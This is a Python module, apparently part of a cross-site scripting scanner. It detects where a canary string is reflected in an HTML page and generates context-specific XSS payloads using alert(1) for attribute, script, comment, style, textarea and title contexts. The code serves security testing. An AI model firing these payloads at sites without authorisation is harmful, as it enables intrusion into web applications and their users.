"""
Context-Aware Payload Generation
Analyzes where user input lands in the HTML response and generates
payloads specifically crafted for that injection context.
"""

import re
from typing import List, Dict, Tuple
from html import escape


# Unique canary that won't appear naturally in any page
CANARY = "xSs7c4n4ry9z"


class InjectionContext:
    """Represents a detected injection context"""
    HTML_BODY = "html_body"
    TAG_ATTRIBUTE_QUOTED = "tag_attr_quoted"
    TAG_ATTRIBUTE_UNQUOTED = "tag_attr_unquoted"
    SCRIPT_STRING_SINGLE = "script_string_single"
    SCRIPT_STRING_DOUBLE = "script_string_double"
    SCRIPT_EXPRESSION = "script_expression"
    HTML_COMMENT = "html_comment"
    STYLE_BLOCK = "style_block"
    STYLE_ATTRIBUTE = "style_attribute"
    TEXTAREA = "textarea"
    TITLE = "title"
    UNKNOWN = "unknown"


class ContextAnalyzer:
    """Analyzes injection context and generates targeted payloads"""

    def __init__(self):
        self.canary = CANARY

    def get_canary(self) -> str:
        """Return the canary string to inject for context detection"""
        return self.canary

    def analyze_context(self, response_body: str) -> List[Dict]:
        """
        Analyze where the canary appears in the response.
        Returns a list of contexts with metadata.
        """
        contexts = []
        search_start = 0

        while True:
            idx = response_body.find(self.canary, search_start)
            if idx == -1:
                break

            context = self._determine_context(response_body, idx)
            contexts.append(context)
            search_start = idx + len(self.canary)

        return contexts

    def _determine_context(self, body: str, canary_pos: int) -> Dict:
        """Determine the injection context at a specific position"""
        # Get surrounding content for analysis
        prefix = body[max(0, canary_pos - 500):canary_pos]
        suffix = body[canary_pos + len(self.canary):canary_pos + len(self.canary) + 200]

        # Check contexts in order of specificity

        # Inside <script> block
        script_ctx = self._check_script_context(prefix, suffix)
        if script_ctx:
            return script_ctx

        # Inside <style> block
        if self._is_inside_tag_block(prefix, 'style'):
            return {
                'context': InjectionContext.STYLE_BLOCK,
                'prefix': prefix[-50:],
                'suffix': suffix[:50]
            }

        # Inside HTML comment
        if self._is_inside_comment(prefix):
            return {
                'context': InjectionContext.HTML_COMMENT,
                'prefix': prefix[-50:],
                'suffix': suffix[:50]
            }

        # Inside <textarea>
        if self._is_inside_tag_block(prefix, 'textarea'):
            return {
                'context': InjectionContext.TEXTAREA,
                'prefix': prefix[-50:],
                'suffix': suffix[:50]
            }

        # Inside <title>
        if self._is_inside_tag_block(prefix, 'title'):
            return {
                'context': InjectionContext.TITLE,
                'prefix': prefix[-50:],
                'suffix': suffix[:50]
            }

        # Inside a tag attribute
        attr_ctx = self._check_attribute_context(prefix, suffix)
        if attr_ctx:
            return attr_ctx

        # Inside style attribute
        if self._is_inside_style_attribute(prefix):
            return {
                'context': InjectionContext.STYLE_ATTRIBUTE,
                'prefix': prefix[-50:],
                'suffix': suffix[:50]
            }

        # Default: HTML body context
        return {
            'context': InjectionContext.HTML_BODY,
            'prefix': prefix[-50:],
            'suffix': suffix[:50]
        }

    def _check_script_context(self, prefix: str, suffix: str) -> Dict | None:
        """Check if canary is inside a <script> block"""
        if not self._is_inside_tag_block(prefix, 'script'):
            return None

        # Determine if inside a string or expression
        # Look at the immediate characters before the canary
        stripped = prefix.rstrip()
        if stripped.endswith("'"):
            return {
                'context': InjectionContext.SCRIPT_STRING_SINGLE,
                'prefix': prefix[-50:],
                'suffix': suffix[:50]
            }
        elif stripped.endswith('"'):
            return {
                'context': InjectionContext.SCRIPT_STRING_DOUBLE,
                'prefix': prefix[-50:],
                'suffix': suffix[:50]
            }
        else:
            return {
                'context': InjectionContext.SCRIPT_EXPRESSION,
                'prefix': prefix[-50:],
                'suffix': suffix[:50]
            }

    def _check_attribute_context(self, prefix: str, suffix: str) -> Dict | None:
        """Check if canary is inside a tag attribute"""
        # Look for pattern like: <tag attr="...CANARY or <tag attr='...CANARY
        # Search backwards for the opening tag
        tag_match = re.search(r'<\w+[^>]*$', prefix)
        if not tag_match:
            return None

        tag_content = prefix[tag_match.start():]

        # Check for quoted attribute
        double_quote_match = re.search(r'=\s*"[^"]*$', tag_content)
        if double_quote_match:
            return {
                'context': InjectionContext.TAG_ATTRIBUTE_QUOTED,
                'quote_char': '"',
                'prefix': prefix[-50:],
                'suffix': suffix[:50]
            }

        single_quote_match = re.search(r"=\s*'[^']*$", tag_content)
        if single_quote_match:
            return {
                'context': InjectionContext.TAG_ATTRIBUTE_QUOTED,
                'quote_char': "'",
                'prefix': prefix[-50:],
                'suffix': suffix[:50]
            }

        # Unquoted attribute
        unquoted_match = re.search(r'=\s*[^\s"\'>=]*$', tag_content)
        if unquoted_match:
            return {
                'context': InjectionContext.TAG_ATTRIBUTE_UNQUOTED,
                'prefix': prefix[-50:],
                'suffix': suffix[:50]
            }

        return None

    def _is_inside_tag_block(self, prefix: str, tag_name: str) -> bool:
        """Check if position is inside a specific tag block"""
        open_pattern = rf'<{tag_name}[^>]*>'
        close_pattern = rf'</{tag_name}>'

        last_open = -1
        for m in re.finditer(open_pattern, prefix, re.IGNORECASE):
            last_open = m.end()

        last_close = -1
        for m in re.finditer(close_pattern, prefix, re.IGNORECASE):
            last_close = m.end()

        return last_open > last_close

    def _is_inside_comment(self, prefix: str) -> bool:
        """Check if position is inside an HTML comment"""
        last_open = prefix.rfind('<!--')
        last_close = prefix.rfind('-->')
        return last_open > last_close

    def _is_inside_style_attribute(self, prefix: str) -> bool:
        """Check if inside a style="" attribute"""
        tag_match = re.search(r'<\w+[^>]*$', prefix)
        if not tag_match:
            return False
        tag_content = prefix[tag_match.start():]
        return bool(re.search(r'style\s*=\s*["\'][^"\']*$', tag_content, re.IGNORECASE))

    def generate_context_payloads(self, context: Dict) -> List[Dict]:
        """Generate payloads optimized for the detected context"""
        ctx_type = context['context']

        generators = {
            InjectionContext.HTML_BODY: self._payloads_html_body,
            InjectionContext.TAG_ATTRIBUTE_QUOTED: self._payloads_attr_quoted,
            InjectionContext.TAG_ATTRIBUTE_UNQUOTED: self._payloads_attr_unquoted,
            InjectionContext.SCRIPT_STRING_SINGLE: self._payloads_script_string_single,
            InjectionContext.SCRIPT_STRING_DOUBLE: self._payloads_script_string_double,
            InjectionContext.SCRIPT_EXPRESSION: self._payloads_script_expression,
            InjectionContext.HTML_COMMENT: self._payloads_html_comment,
            InjectionContext.STYLE_BLOCK: self._payloads_style_block,
            InjectionContext.STYLE_ATTRIBUTE: self._payloads_style_attribute,
            InjectionContext.TEXTAREA: self._payloads_textarea,
            InjectionContext.TITLE: self._payloads_title,
        }

        generator = generators.get(ctx_type, self._payloads_html_body)
        return generator(context)

    def _payloads_html_body(self, context: Dict) -> List[Dict]:
        """Payloads for HTML body context"""
        return [
            {'payload': '<script>alert(1)</script>', 'type': 'Reflected XSS', 'severity': 'High'},
            {'payload': '<img src=x onerror=alert(1)>', 'type': 'Event Handler XSS', 'severity': 'High'},
            {'payload': '<svg onload=alert(1)>', 'type': 'SVG XSS', 'severity': 'High'},
            {'payload': '<details open ontoggle=alert(1)>', 'type': 'Details XSS', 'severity': 'High'},
            {'payload': '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>', 'type': 'MathML XSS', 'severity': 'High'},
            {'payload': '<iframe srcdoc="<script>alert(1)</script>">', 'type': 'Iframe Srcdoc XSS', 'severity': 'High'},
        ]

    def _payloads_attr_quoted(self, context: Dict) -> List[Dict]:
        """Payloads for quoted attribute context"""
        quote = context.get('quote_char', '"')
        return [
            {'payload': f'{quote}><script>alert(1)</script>', 'type': 'Attribute Escape XSS', 'severity': 'High'},
            {'payload': f'{quote} onfocus=alert(1) autofocus {quote}', 'type': 'Event Injection XSS', 'severity': 'High'},
            {'payload': f'{quote} onmouseover=alert(1) {quote}', 'type': 'Event Injection XSS', 'severity': 'High'},
            {'payload': f'{quote}><img src=x onerror=alert(1)>', 'type': 'Attribute Break XSS', 'severity': 'High'},
            {'payload': f'{quote}><svg/onload=alert(1)>', 'type': 'SVG Attribute Break', 'severity': 'High'},
            {'payload': f'javascript:alert(1)', 'type': 'JavaScript Protocol XSS', 'severity': 'Medium'},
        ]

    def _payloads_attr_unquoted(self, context: Dict) -> List[Dict]:
        """Payloads for unquoted attribute context"""
        return [
            {'payload': ' onfocus=alert(1) autofocus ', 'type': 'Unquoted Event XSS', 'severity': 'High'},
            {'payload': ' onmouseover=alert(1) ', 'type': 'Unquoted Event XSS', 'severity': 'High'},
            {'payload': '><script>alert(1)</script>', 'type': 'Tag Break XSS', 'severity': 'High'},
            {'payload': '><img src=x onerror=alert(1)>', 'type': 'Tag Break XSS', 'severity': 'High'},
        ]

    def _payloads_script_string_single(self, context: Dict) -> List[Dict]:
        """Payloads for inside single-quoted JS string"""
        return [
            {'payload': "';alert(1);//", 'type': 'Script String Break XSS', 'severity': 'Critical'},
            {'payload': "'-alert(1)-'", 'type': 'Script Expression XSS', 'severity': 'Critical'},
            {'payload': "';</script><script>alert(1)</script>", 'type': 'Script Block Break XSS', 'severity': 'Critical'},
            {'payload': "\\';alert(1);//", 'type': 'Escape Bypass XSS', 'severity': 'High'},
        ]

    def _payloads_script_string_double(self, context: Dict) -> List[Dict]:
        """Payloads for inside double-quoted JS string"""
        return [
            {'payload': '";alert(1);//', 'type': 'Script String Break XSS', 'severity': 'Critical'},
            {'payload': '"-alert(1)-"', 'type': 'Script Expression XSS', 'severity': 'Critical'},
            {'payload': '";</script><script>alert(1)</script>', 'type': 'Script Block Break XSS', 'severity': 'Critical'},
            {'payload': '\\";alert(1);//', 'type': 'Escape Bypass XSS', 'severity': 'High'},
        ]

    def _payloads_script_expression(self, context: Dict) -> List[Dict]:
        """Payloads for inside JS expression context"""
        return [
            {'payload': ';alert(1);//', 'type': 'Script Injection XSS', 'severity': 'Critical'},
            {'payload': '-alert(1)-', 'type': 'Expression XSS', 'severity': 'Critical'},
            {'payload': '</script><script>alert(1)</script>', 'type': 'Script Block Break XSS', 'severity': 'Critical'},
            {'payload': '};alert(1);{//', 'type': 'Block Break XSS', 'severity': 'Critical'},
        ]

    def _payloads_html_comment(self, context: Dict) -> List[Dict]:
        """Payloads for HTML comment context"""
        return [
            {'payload': '--><script>alert(1)</script><!--', 'type': 'Comment Break XSS', 'severity': 'High'},
            {'payload': '--><img src=x onerror=alert(1)><!--', 'type': 'Comment Break XSS', 'severity': 'High'},
            {'payload': '--><svg onload=alert(1)><!--', 'type': 'Comment Break XSS', 'severity': 'High'},
        ]

    def _payloads_style_block(self, context: Dict) -> List[Dict]:
        """Payloads for inside <style> block"""
        return [
            {'payload': '</style><script>alert(1)</script>', 'type': 'Style Break XSS', 'severity': 'High'},
            {'payload': '</style><img src=x onerror=alert(1)>', 'type': 'Style Break XSS', 'severity': 'High'},
        ]

    def _payloads_style_attribute(self, context: Dict) -> List[Dict]:
        """Payloads for style attribute context"""
        return [
            {'payload': '"><img src=x onerror=alert(1)>', 'type': 'Style Attr Break XSS', 'severity': 'High'},
            {'payload': "';}<img src=x onerror=alert(1)>", 'type': 'Style Attr Break XSS', 'severity': 'High'},
        ]

    def _payloads_textarea(self, context: Dict) -> List[Dict]:
        """Payloads for <textarea> context"""
        return [
            {'payload': '</textarea><script>alert(1)</script>', 'type': 'Textarea Break XSS', 'severity': 'High'},
            {'payload': '</textarea><img src=x onerror=alert(1)>', 'type': 'Textarea Break XSS', 'severity': 'High'},
            {'payload': '</textarea><svg onload=alert(1)>', 'type': 'Textarea Break XSS', 'severity': 'High'},
        ]

    def _payloads_title(self, context: Dict) -> List[Dict]:
        """Payloads for <title> context"""
        return [
            {'payload': '</title><script>alert(1)</script>', 'type': 'Title Break XSS', 'severity': 'High'},
            {'payload': '</title><img src=x onerror=alert(1)>', 'type': 'Title Break XSS', 'severity': 'High'},
        ]
